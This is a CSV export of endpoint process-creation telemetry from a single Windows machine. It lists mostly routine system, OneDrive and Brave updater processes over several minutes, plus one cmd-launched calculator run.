Timestamp,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,RemoteIP
"Sep 16, 2025 2:44:14 PM",slflarewinsysmo,slflare,StartMenuExperienceHost.exe,"""StartMenuExperienceHost.exe"" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:17 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:21 PM",slflarewinsysmo,slflare,SearchApp.exe,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:21 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe SyncFromCloud,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:24 PM",slflarewinsysmo,slflare,wlrmdr.exe, -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty,winlogon.exe,winlogon.exe,159.26.106.84
"Sep 16, 2025 2:44:24 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:28 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:34 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXe9cvj1thv1hmcw0cs98xm3r97tyzy2xs.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,ClipESUConsumer.exe,"""ClipESUConsumer.exe"" -evaluateEligibility",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,calc.exe,calc.exe,cmd.exe,"""cmd.exe"" /c calc.exe",159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,ClipESUConsumer.exe,"""ClipESUConsumer.exe"" -processRefund",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,OneDriveStandaloneUpdater.exe,"""OneDriveStandaloneUpdater.exe"" /reporting",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,OneDriveStandaloneUpdater.exe,OneDriveStandaloneUpdater.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /c",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,rundll32.exe,"""rundll32.exe"" C:\Windows\system32\PcaSvc.dll,PcaWallpaperAppDetect",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:39 PM",slflarewinsysmo,slflare,HxTsr.exe,"""HxTsr.exe"" -ServerName:Hx.IPC.Server",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:41 PM",slflarewinsysmo,slflare,mobsync.exe,mobsync.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:46 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{722D0F89-B69C-4700-AE8C-4A44350E4876},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:47 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:48 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:51 PM",slflarewinsysmo,slflare,SecurityHealthSystray.exe,SecurityHealthSystray.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:52 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:52 PM",slflarewinsysmo,slflare,OneDrive.exe,"""OneDrive.exe"" /background",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:54 PM",slflarewinsysmo,slflare,BraveUpdateCore.exe,BraveUpdateCore.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:55 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:55 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""",159.26.106.84
"Sep 16, 2025 2:44:56 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:56 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:57 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""",159.26.106.84
"Sep 16, 2025 2:45:00 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /c",braveupdatecore.exe,BraveUpdateCore.exe,159.26.106.84
"Sep 16, 2025 2:45:07 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:08 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:10 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:15 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /cr",braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:21 PM",slflarewinsysmo,slflare,BraveCrashHandler.exe,BraveCrashHandler.exe,braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:21 PM",slflarewinsysmo,slflare,SearchApp.exe,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:31 PM",slflarewinsysmo,slflare,BraveCrashHandler64.exe,BraveCrashHandler64.exe,braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:36 PM",slflarewinsysmo,slflare,OneDriveSetup.exe,"""OneDriveSetup.exe"" /update /restart /updateSource:ODU ",onedrive.exe,"""OneDrive.exe"" /background",159.26.106.84
"Sep 16, 2025 2:45:41 PM",slflarewinsysmo,slflare,MusNotificationUx.exe,MusNotificationUx.exe ClearActiveNotifications,musnotification.exe,"""MusNotification.exe"" LogonUpdateResults",159.26.106.84
"Sep 16, 2025 2:45:41 PM",slflarewinsysmo,slflare,OneDriveSetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,onedrivesetup.exe,"""OneDriveSetup.exe"" /update /restart /updateSource:ODU ",159.26.106.84
"Sep 16, 2025 2:45:43 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource core",braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:46 PM",slflarewinsysmo,slflare,ApplicationFrameHost.exe,ApplicationFrameHost.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:47 PM",slflarewinsysmo,slflare,CalculatorApp.exe,CalculatorApp.exe,sihost.exe,sihost.exe,159.26.106.84
"Sep 16, 2025 2:45:51 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:53 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:01 PM",slflarewinsysmo,slflare,OneDrive.Sync.Service.exe,"""OneDrive.Sync.Service.exe"" /silentConfig",onedrivestandaloneupdater.exe,OneDriveStandaloneUpdater.exe,159.26.106.84
"Sep 16, 2025 2:46:07 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:25 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:42 PM",slflarewinsysmo,slflare,FileSyncConfig.exe,FileSyncConfig.exe,onedrivesetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,159.26.106.84
"Sep 16, 2025 2:46:49 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:50 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:51 PM",slflarewinsysmo,slflare,svchost.exe,svchost.exe -k DevicesFlow,services.exe,services.exe,159.26.106.84
"Sep 16, 2025 2:46:54 PM",slflarewinsysmo,slflare,OneDrive.exe,updateInstalled /background,onedrivesetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,159.26.106.84
"Sep 16, 2025 2:47:02 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:47:04 PM",slflarewinsysmo,slflare,OneDrive.Sync.Service.exe,silentConfig,onedrivesetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,159.26.106.84
"Sep 16, 2025 2:47:16 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:47:44 PM",slflarewinsysmo,slflare,PhoneExperienceHost.exe,"""PhoneExperienceHost.exe"" -ComServer:Background -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXe9cvj1thv1hmcw0cs98xm3r97tyzy2xs.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,HxTsr.exe,"""HxTsr.exe"" -ServerName:Hx.IPC.Server",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Logon,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:48:54 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:WindowsBackup.AppXnn6fnh4raxtmg45ba8k2f4ykb7n0k3y4.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:Global.RulesEngine.AppXgphnekvm0vv49drvfehh4b6kyf6ckafp.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXpybpk6fj2fe0gb0jan49e6dncngk3pa1.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:01 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:03 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:16 PM",slflarewinsysmo,slflare,BackgroundTransferHost.exe,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:21 PM",slflarewinsysmo,slflare,WindowsPackageManagerServer.exe,"""WindowsPackageManagerServer.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:51:34 PM",slflarewinsysmo,slflare,SearchApp.exe,"""SearchApp.exe"" -ServerName:ShellFeedsUI.AppX88fpyyrd21w8wqe62wzsjh5agex7tf1e.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:51:37 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",searchapp.exe,"""SearchApp.exe"" -ServerName:ShellFeedsUI.AppX88fpyyrd21w8wqe62wzsjh5agex7tf1e.mca",159.26.106.84
"Sep 16, 2025 2:51:37 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=crashpad-handler --user-data-dir=C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=140.0.7339.81 ""--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\140.0.3485.54\msedgewebview2.exe"" --annotation=plat=Win64 ""--annotation=prod=Edge WebView2"" --annotation=ver=140.0.3485.54 --initial-client-data=0x170,0x174,0x178,0x14c,0x180,0x7ffe25ea2200,0x7ffe25ea220c,0x7ffe25ea2218",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
